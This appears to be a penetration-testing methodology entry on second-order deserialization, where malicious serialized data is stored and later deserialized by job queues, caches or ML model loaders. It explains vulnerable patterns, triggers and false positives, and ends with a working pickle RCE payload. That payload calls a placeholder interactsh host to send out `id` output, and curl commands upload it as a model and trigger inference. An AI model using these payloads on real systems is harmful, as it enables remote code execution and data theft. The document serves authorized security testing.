# Second-Order Deserialization

## Purpose

Test applications where attacker-controlled serialized data is not immediately deserialized at the injection point but instead stored (database, cache, file, queue) and later deserialized by a separate process — requiring identification of both the injection path and the asynchronous or deferred trigger.

## Applicability

- Applications with import/export functionality processing serialized file formats
- Background job queues (Sidekiq, Celery, Resque, Quartz, Hangfire) where job arguments are serialized
- Admin-triggered batch operations (report generation, data export, cache warm, audit log processing)
- Cache systems (Redis, Memcached) storing serialized objects keyed by user-controllable identifiers
- Database columns storing serialized session data, user preferences, or audit objects
- Profile/avatar/config upload endpoints where uploaded content is later processed server-side

## Preconditions

- Attacker can write attacker-controlled bytes to a storage location that will later be deserialized
- The deserializing process uses an unsafe sink (`pickle.loads`, `unserialize`, `ObjectInputStream`, etc.)
- The trigger for deserialization is reachable (attacker can initiate it, or it fires automatically)
- The storage-to-deserialization path does not sanitize or re-encode the payload (preserves raw bytes)

## Relevant Architecture

**Storage → background worker**
```
Attacker injects payload via API/upload
    → stored in DB / Redis / S3 / filesystem
    → background job dequeues / admin triggers export / cache warm
    → deserialize(stored_blob)     ← sink
    → gadget chain → RCE
```

**Import → process**
```
Attacker uploads .pkl / .joblib / .npy / .rds / custom format
    → file stored at upload path
    → server-side processing (ML inference, data analysis, admin review)
    → pickle.loads(open(uploaded_file, 'rb').read())    ← sink
    → RCE
```

**Cache poisoning path**
```
Attacker writes to cache via unauthenticated endpoint or key injection
    → cache stores serialized blob under attacker-influenced key
    → legitimate user request triggers cache read + deserialize
    → gadget chain executes in worker/request context
```

## Technical Knowledge

**Identifying storage-to-deserialization patterns (white-box)**
```python
# Python: cached model / user data
cached = redis_client.get(f"user_prefs:{user_id}")
prefs = pickle.loads(cached)  # if user_id influences the key content

# Background job with serialized args
job_data = json.loads(queue.dequeue())
obj = pickle.loads(base64.b64decode(job_data["payload"]))
```

```java
// Java: cached session object
byte[] cachedBytes = redisTemplate.opsForValue().get("session:" + sessionId);
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(cachedBytes));
Object session = ois.readObject();      // second-order sink

// Quartz job data map
JobDataMap dataMap = context.getJobDetail().getJobDataMap();
// if dataMap was stored with Java serialized values
```

```php
// PHP: DB column with serialized data
$row = $db->query("SELECT preferences FROM users WHERE id = ?", [$userId])->fetch();
$prefs = unserialize($row['preferences']);   // if preferences column accepts user input
```

**Trigger types**

| Trigger | Notes |
|---------|-------|
| Admin action (export, review) | May require social engineering or CSRF to trigger |
| Scheduled batch job | Predictable timing; wait for trigger or identify cron schedule |
| Cache miss → cache warm | Trigger by invalidating cache key (if possible) |
| User-initiated (download, view, render) | Highest value — attacker can self-trigger |
| Webhook / event processor | Trigger by causing the event |
| CI/CD pipeline | Trigger by committing / pushing to repository |

**File format deserialization traps**

| Format | Deserialization risk |
|--------|---------------------|
| `.pkl` / `.pickle` | Python pickle — RCE by design |
| `.joblib` | Wraps pickle — same risk |
| `.npy` / `.npz` | NumPy; `allow_pickle=True` enables object arrays |
| `.pt` / `.pth` | PyTorch model files (use pickle internally) |
| `.h5` / `.hdf5` | Keras/HDF5; generally safe but check custom object hooks |
| `.rds` / `.RData` | R serialized objects; `readRDS()` can execute arbitrary R code |
| Java `.ser` | Native Java serialization |
| PHP session files | `unserialize()` on session file content |

**Delay and timing considerations**
- Second-order sinks may trigger seconds, minutes, or hours after injection
- Use a persistent OAST listener (interactsh running as daemon) or long-lived Burp Collaborator poll
- Log the injection time and monitor for delayed callbacks
- Some triggers are one-shot — if missed, re-inject

## Indicators

**Black-box**
- Import/upload endpoint accepts opaque binary format (`.pkl`, `.joblib`, `.ser`, custom)
- Admin panel with "export", "process", "analyze", "batch" operations
- API endpoint accepting serialized data for "saving" or "queuing" (no immediate complex response)
- Profile/config "blob" stored server-side (not returned immediately)
- Application uses Redis/Memcache with user-influenced cache keys visible in errors

**White-box**
- `pickle.loads` / `unserialize` / `ObjectInputStream.readObject` called on data fetched from DB/cache
- Background worker (`@celery_task`, `perform_async`, `delay`) processes user-supplied data
- ORM model with a field using custom serialized type (`PickleField`, `SerializedField`)
- File upload handler storing file, separate job picking it up for processing

## Interpretation

1. **Import endpoint accepts file without immediate complex processing** → file likely deferred; monitor OAST after upload
2. **Admin "process uploaded data" button exists** → manually trigger after injecting payload; watch OAST
3. **Cache key includes user-controlled component** → attempt cache key injection to store payload under victim key
4. **OOB callback received with delay** → second-order sink confirmed; note lag for documentation
5. **No callback even after triggering** → processing path may use a different (safe) deserialization format; trace data flow further

## Security-Relevant Conditions

- **ML model upload to inference endpoint**: Extremely high risk — PyTorch/sklearn models use pickle; any model upload = potential RCE
- **Redis with no auth and user-influenced keys**: Cache poisoning with serialized payload
- **Admin export triggering deserialize of user-stored data**: Requires admin trigger (manual or CSRF/XSS pivot)
- **CI/CD file parsing**: Configuration files (`.yml`, serialized config) deserialized during pipeline execution
- **Celery / Sidekiq with pickle serializer**: Job queue arguments deserialized by workers; injection via job creation API

## Experiment Considerations

- Identify and document the full injection-to-trigger chain before testing
- Maintain OAST listener for extended periods (hours) when trigger timing is unknown
- For admin-triggered sinks: social engineering or CSRF/stored-XSS may be needed to trigger — document the complete attack chain
- For scheduled jobs: identify cron timing from source or by observing periodic effects; time injection accordingly
- If trigger is self-service (e.g., "analyze my uploaded data"), the attack is fully attacker-controlled — highest severity
- Prefer minimal payloads (DNS callback) to avoid persistent side effects in storage

## Evidence Expectations

1. Injection point documented (endpoint URL, parameter/file field, format)
2. Storage location identified (DB table/column, Redis key pattern, file path)
3. Trigger mechanism documented (cron, admin action, user action, webhook)
4. OOB callback received after trigger → sink reached → RCE demonstrated
5. Full chain: inject → store → trigger → deserialize → exec — documented with timing

## Failure Interpretation

| Observation | Interpretation |
|-------------|---------------|
| File uploaded but no OAST callback after trigger | Processing uses safe path; check alternative formats or triggers |
| OAST callback never arrives (hours later) | Trigger not reached; identify correct trigger or timing |
| Stored data is retrieved but re-encoded before deserialize | Application sanitizes between storage and sink; not vulnerable on this path |
| Admin trigger requires 2FA / CSRF token | Need additional access or CSRF bypass to trigger; document chain complexity |
| ML inference endpoint rejects non-model file structure | Framework validates file header; try disguising payload in valid model wrapper |

## False Positives

- File is stored and later processed but deserialization uses a safe parser (`json.loads`, `yaml.safe_load`, schema-validated XML)
- Redis cache used but `get()` result goes through schema validation before any object instantiation
- Uploaded model file processed but framework uses a safe loader (`torch.load(..., weights_only=True)` in PyTorch 2.0+)
- DB column stores serialized data but only read by internal privileged service with no user-controlled keys

## Limitations

- Trigger identification may require white-box access or extensive behavioral observation
- Admin-required triggers introduce additional complexity and may not be independently exploitable
- Delayed callbacks require persistent monitoring infrastructure; ephemeral OAST sessions miss them
- Some ML frameworks (TensorFlow SavedModel, ONNX) use safer serialization than pickle — verify per framework
- PyTorch `weights_only=True` (available from 1.13, default in 2.0+) mitigates pickle RCE for model files — confirm parameter

## Related Knowledge

- `python-pickle` — underlying Python sink in most second-order ML/cache scenarios
- `java-native` — underlying Java sink in job queue / cache second-order paths
- `php-object` — `unserialize()` on DB-stored PHP data
- `ruby-marshal` — Sidekiq/Redis Marshal scenario
- PyTorch `torch.load` security: `weights_only` parameter and CVE-2025-32434 (arbitrary code via checkpoint)
- Celery security: pickle serializer (legacy default) vs. JSON serializer (safe default since Celery 4)

## Tooling

```python
#!/usr/bin/env python3
# second_order_pickle.py — generate payload for ML model / cache injection
import pickle, os, base64


class Exploit:
    def __reduce__(self):
        # OOB callback — replace with interactsh host
        return (
            os.system,
            ("curl http://<interactsh-host>/?src=second_order&q=$(id|base64 -w0)",),
        )


# Raw bytes for file upload
with open("payload.pkl", "wb") as f:
    pickle.dump(Exploit(), f)

# Base64 for cache/API injection
print("Base64:", base64.b64encode(pickle.dumps(Exploit())).decode())
print("Payload file: payload.pkl")
```

```bash
# Upload as ML model
curl -s -X POST https://target/api/models/upload \
  -F 'model=@payload.pkl;type=application/octet-stream'

# Trigger inference/processing
curl -s -X POST https://target/api/models/<model-id>/predict \
  -H 'Content-Type: application/json' \
  -d '{"input": [1,2,3]}'

# Monitor OAST listener (keep running during full test)
interactsh-client -v &
OAST_PID=$!

# ... inject, trigger, wait ...
# Check for callbacks before stopping
kill $OAST_PID
```